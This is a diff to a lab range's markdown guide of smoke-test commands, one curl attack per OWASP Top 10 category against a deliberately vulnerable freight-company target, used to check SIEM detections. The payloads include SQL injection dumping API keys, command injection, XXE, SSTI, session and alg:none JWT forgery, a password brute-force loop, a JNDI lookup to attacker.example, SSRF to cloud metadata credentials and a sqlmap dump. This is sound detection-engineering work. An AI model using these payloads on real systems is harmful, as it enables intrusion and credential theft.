@@ -1,9 +1,11 @@
 # OWASP Top 10 test commands
 
-One command per OWASP Top 10 2021 category, with the detection event each one
-produces. These are the *smoke tests* — run them to prove the range and the SIEM
-pipeline work. For the full exploitation walkthroughs with flags, MITRE mapping
-and SPL, see [`ASSESSMENT_PLAYBOOK.md`](ASSESSMENT_PLAYBOOK.md).
+One command per OWASP Top 10 2021 category against the Meridian Freight Solutions
+target, with the detection event each one produces. These are *smoke tests* — run
+them to prove the range and the SIEM pipeline work. For the full walkthroughs
+with the recovered data, MITRE mapping and remediation, see
+[`ASSESSMENT_PLAYBOOK.md`](ASSESSMENT_PLAYBOOK.md); for a staged intrusion see
+[`ATTACK_SIMULATION.md`](ATTACK_SIMULATION.md).
 
 Run them only against an isolated lab host.
 
@@ -18,34 +20,51 @@ Tag a run so you can isolate it in Splunk:
 export TAG='X-Lab-Test-ID: smoke-run-1'
 ```
 
+Proof of exploitation is a `MERIDIAN{...}` value inside recovered data, never a
+field named `flag`.
+
 ## A01 — Broken Access Control
 
 ```bash
-curl -sS -H "$TAG" "$TARGET/api/users/1337"
-curl -sS -H "$TAG" --get --data-urlencode 'file=../flagstore/traversal.flag' \
-  "$TARGET/api/documents/download"
+# IDOR: another customer's consignment (no auth, no ownership check)
+curl -sS -H "$TAG" "$TARGET/api/v1/shipments/MFS-2026-4471"
+# Path traversal: application secrets outside the document root
+curl -sS -H "$TAG" --get --data-urlencode 'document=../instance/app-secrets.ini' \
+  "$TARGET/api/v1/invoices/download"
 ```
 
 Events: `broken_access_attempt allowed=true`, `path_traversal_attempt`.
-Use cases: UC-04, UC-08. Challenges: `access-idor`, `file-traversal`.
+Use cases: UC-04, UC-08. Findings: `idor-shipment`, `traversal-invoice`.
 
 ## A02 — Cryptographic Failures
 
 ```bash
-curl -sS -H "$TAG" "$TARGET/api/backup"
-curl -sS -H "$TAG" "$TARGET/admin/panel"
+# Forged staff session signed with the default key (finding weak-session-secret)
+FORGED=$(python3 tools/forge_session.py --secret meridian-default-signing-key)
+curl -sS -H "$TAG" -H "Cookie: session=$FORGED" "$TARGET/admin"
+# Predictable reset token = md5(username) (finding reset-token)
+curl -sS -H "$TAG" "$TARGET/portal/reset"
 ```
 
-Events: `sensitive_data_exposure`, `admin_panel_access granted=false`.
-Use cases: UC-02, UC-14. Challenges: `auth-weak-secret`, `auth-reset-token`.
+Events: `forged_session_detected`, `admin_panel_access granted=true`.
+Use cases: UC-14, UC-15. Findings: `weak-session-secret`, `reset-token`.
 
 ## A03 — Injection
 
 ```bash
-curl -sS -H "$TAG" --get --data-urlencode "q=' OR 1=1--" "$TARGET/api/products/search"
-curl -sS -H "$TAG" --get --data-urlencode 'name=<script>alert(1)</script>' "$TARGET/reflect"
-curl -sS -H "$TAG" --get --data-urlencode 'host=127.0.0.1; id' "$TARGET/api/diagnostics/ping"
-curl -sS -H "$TAG" --get --data-urlencode 'template={{7*7}}' "$TARGET/api/newsletter/preview"
+# SQL injection (rate lookup) and auth bypass (legacy login)
+curl -sS -H "$TAG" --get \
+  --data-urlencode "q=' UNION SELECT id,partner,api_key FROM integration_credentials-- " \
+  "$TARGET/api/v1/rates/search"
+# Reflected XSS (site search)
+curl -sS -H "$TAG" --get --data-urlencode 'q=<script>alert(1)</script>' "$TARGET/search"
+# Command injection (staff depot check) - needs a staff session cookie
+curl -sS -H "$TAG" -H "Cookie: session=$FORGED" -H 'Content-Type: application/json' \
+  -X POST "$TARGET/admin/diagnostics" \
+  -d '{"host":"127.0.0.1; cat instance/keys/depot-transfer.key"}'
+# SSTI (campaign preview)
+curl -sS -H "$TAG" -H "Cookie: session=$FORGED" --get --data-urlencode 'body={{7*7}}' \
+  "$TARGET/admin/campaigns/preview"
 ```
 
 Events: `sql_query suspicious=true`, `xss_probe`, `command_injection_attempt`
@@ -58,9 +77,12 @@ one detection gets built from this lab, build that one.
 ## A04 — Insecure Design
 
 ```bash
-curl -sS -H "$TAG" -X POST "$TARGET/api/checkout" -H 'Content-Type: application/json' \
-  -d '{"quantity":-5,"unit_price":100}'
-printf 'test' > /tmp/t.php && curl -sS -H "$TAG" -X POST "$TARGET/api/upload" -F 'file=@/tmp/t.php'
+# Negative quantity issues a credit note (finding logic-negative-quote)
+curl -sS -H "$TAG" -X POST "$TARGET/services/quote" -H 'Content-Type: application/json' \
+  -d '{"weight_kg":-1200,"rate_per_kg":0.42}'
+# Unrestricted upload lands in a browsable store (finding upload-unrestricted)
+printf 'test' > /tmp/cv.php
+curl -sS -H "$TAG" -X POST "$TARGET/careers/apply" -F 'cv=@/tmp/cv.php'
 ```
 
 Events: `business_logic_abuse negative_total=true`, `dangerous_upload`.
@@ -69,11 +91,12 @@ Use cases: UC-17, UC-12.
 ## A05 — Security Misconfiguration
 
 ```bash
-curl -sS -H "$TAG" "$TARGET/api/debug/config"
-curl -sS -H "$TAG" "$TARGET/.env"
-curl -sS -H "$TAG" "$TARGET/backups/"
-curl -sS -H "$TAG" -X POST "$TARGET/api/suppliers/import" -H 'Content-Type: application/xml' \
-  --data-binary '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY e SYSTEM "file:///etc/hostname">]><r>&e;</r>'
+curl -sS -H "$TAG" "$TARGET/status/diagnostics"      # dev status page
+curl -sS -H "$TAG" "$TARGET/.env"                    # env file in the web root
+curl -sS -H "$TAG" "$TARGET/backups/"                # autoindexed export dir
+# XXE via the supplier EDI import
+curl -sS -H "$TAG" -X POST "$TARGET/api/v1/edi/manifest" -H 'Content-Type: application/xml' \
+  --data-binary '<?xml version="1.0"?><!DOCTYPE m [<!ENTITY e SYSTEM "file:///etc/hostname">]><m>&e;</m>'
 ```
 
 Events: `debug_endpoint_access`, `sensitive_file_access`,
@@ -83,67 +106,72 @@ Use cases: UC-03, UC-02, UC-11.
 ## A06 — Vulnerable and Outdated Components
 
 ```bash
-curl -sS -H "$TAG" "$TARGET/api/components"
-curl -sS -H "$TAG" -H 'X-Audit-Agent: ${jndi:ldap://attacker.lab.invalid/a}' "$TARGET/api/legacy/audit"
+curl -sS -H "$TAG" "$TARGET/status/diagnostics" | grep -o 'log4j-core[^,]*'
+# Log4Shell-class lookup in a logged header (finding jndi-audit)
+curl -sS -H "$TAG" -H 'X-Tracking-Agent: ${jndi:ldap://attacker.example/a}' \
+  "$TARGET/api/v1/audit/event"
 ```
 
 Events: `outdated_component_inventory`, `jndi_lookup_detected`.
 Use case: UC-18.
 
-The component versions are simulated, not installed dependencies, and the JNDI
-lookup is recorded without ever being resolved. No outbound LDAP request is made.
+The component versions are simulated, not installed, and the JNDI lookup is
+recorded without ever being resolved. No outbound LDAP request is made.
 
 ## A07 — Identification and Authentication Failures
 
 ```bash
-for i in 1 2 3 4 5 6; do
-  curl -sS -H "$TAG" -X POST "$TARGET/api/login" -H 'Content-Type: application/json' \
-    -d '{"username":"svc_backup","password":"wrong"}'
+# No lockout: brute the service account (svc_edi / autumn2024)
+for p in Autumn2023 autumn2023 Password1 summer2024 autumn2024; do
+  curl -sS -H "$TAG" -X POST "$TARGET/portal/login" -H 'Content-Type: application/json' \
+    -d "{\"username\":\"svc_edi\",\"password\":\"$p\"}"
 done
-curl -sS -H "$TAG" -X POST "$TARGET/api/login" -H 'Content-Type: application/json' \
-  -d '{"username":"svc_backup","password":"summer2024"}'
+# Unsigned partner token (alg:none) reaching the financial report
+b64() { printf '%s' "$1" | base64 | tr -d '=\n' | tr '/+' '_-'; }
+TOKEN="$(b64 '{"alg":"none","typ":"JWT"}').$(b64 '{"sub":"harborline","role":"finance"}')."
+curl -sS -H "$TAG" -H "Authorization: Bearer $TOKEN" "$TARGET/api/v1/reports/financial"
 ```
 
-Events: repeated `authentication_attempt success=false`, then
-`brute_force_suspected lockout_applied=false`, then a success.
-Use case: UC-13. The failure-then-success sequence is the alert that matters.
+Events: repeated `authentication_attempt`, then `brute_force_suspected`, then a
+success; and `jwt_unsigned_accepted`.
+Use cases: UC-13, UC-14. The failure-then-success sequence is the alert that matters.
 
 ## A08 — Software and Data Integrity Failures
 
 ```bash
-curl -sS -H "$TAG" -X POST "$TARGET/api/preferences/import" -H 'Content-Type: application/json' \
-  -d '{"role":"admin"}'
-curl -sS -H "$TAG" -X POST "$TARGET/api/profile/update" -H 'Content-Type: application/json' \
-  -d '{"role":"admin"}'
+# Mass assignment: set account_type from the profile form (finding access-massassign)
+curl -sS -H "$TAG" -X POST "$TARGET/portal/profile" -H 'Content-Type: application/json' \
+  -d '{"contact_name":"Dana","account_type":"operations"}'
 ```
 
-Events: `unsigned_data_import signature_checked=false`,
-`privilege_change mechanism=mass_assignment`.
+Event: `privilege_change mechanism=mass_assignment`.
 Use case: UC-05.
 
 ## A09 — Security Logging and Monitoring Failures
 
-```bash
-curl -sS -H "$TAG" -X POST "$TARGET/api/quiet-transfer" -H 'Content-Type: application/json' \
-  -d '{"amount":9999}'
-```
+The `monitoring_gap_simulated` teaching event (UC-19) fires on an action logged
+without actor or destination. Every finding also emits `artifact_disclosed`
+(UC-22) when real data leaves — the event a SOC should alert on:
 
-Event: `monitoring_gap_simulated` with deliberately missing actor and destination.
-Use case: UC-19. This one teaches by absence — the event exists but cannot be
-attributed, which is the point.
+```bash
+curl -sS -H "$TAG" "$TARGET/api/v1/shipments/MFS-2026-4471" >/dev/null
+jq -r 'select(.test_id=="smoke-run-1" and .event_type=="artifact_disclosed")
+  | "\(.finding_title): \(.proof_artifact)"' logs/meridian-events.jsonl
+```
 
 ## A10 — Server-Side Request Forgery
 
 ```bash
-curl -sS -H "$TAG" --get --data-urlencode 'url=http://metadata:8080/latest/meta-data/' \
-  "$TARGET/api/fetch"
-curl -sS -H "$TAG" --get --data-urlencode 'url=http://169.254.169.254/' "$TARGET/api/fetch"
+# Link preview fetches an internal URL (finding ssrf-metadata) - staff session
+curl -sS -H "$TAG" -H "Cookie: session=$FORGED" --get --data-urlencode \
+  'url=http://metadata:8080/latest/meta-data/iam/security-credentials/mfs-web-instance-role' \
+  "$TARGET/admin/integrations/preview"
 ```
 
 Event: `ssrf_probe`. Use case: UC-16.
 
-Egress is bounded to an allow-list of lab-internal hosts, so this cannot be used
-to reach your corporate network. Outside Docker the metadata service is on
+Egress is bounded to an allow-list of lab-internal hosts, so this cannot reach
+your corporate network. Outside Docker the metadata service is on
 `http://127.0.0.1:8080`.
 
 ## Confirm everything landed
@@ -166,17 +194,17 @@ katana -u "$TARGET" -jc -d 3 -o katana-urls.txt
 httpx -u "$TARGET" -status-code -title -tech-detect
 ffuf -u "$TARGET/FUZZ" -w wordlists/meridian-paths.txt -mc all -of json -o ffuf.json
 gobuster dir -u "$TARGET" -w wordlists/meridian-paths.txt -o gobuster.txt
-sqlmap -u "$TARGET/api/products/search?q=test" -p q --batch --dbms=sqlite --dump -T flags
+sqlmap -u "$TARGET/api/v1/rates/search?q=test" -p q --batch --dbms=sqlite \
+       --dump -T integration_credentials
 ```
 
-Run a scanner and the playbook chain back to back, then compare what your alerts
-produced for each. Section 8 of [`ASSESSMENT_PLAYBOOK.md`](ASSESSMENT_PLAYBOOK.md) explains why
-that comparison is the most useful tuning exercise on this range.
+Run a scanner and the staged simulation back to back, then compare what your
+alerts produced for each. Section 8 of [`ATTACK_SIMULATION.md`](ATTACK_SIMULATION.md)
+explains why that comparison is the most useful tuning exercise on this range.
 
 ## Full automated run
 
 ```bash
-./tools/validate_range.sh "$TARGET"
+./tools/validate_range.sh "$TARGET"      # recovers all 22 artifacts
+./tools/simulate_attack.sh "$TARGET"     # staged intrusion, one source, SIEM-paced
 ```
-
-Solves all 22 challenges, submits every flag, and reports pass/fail.
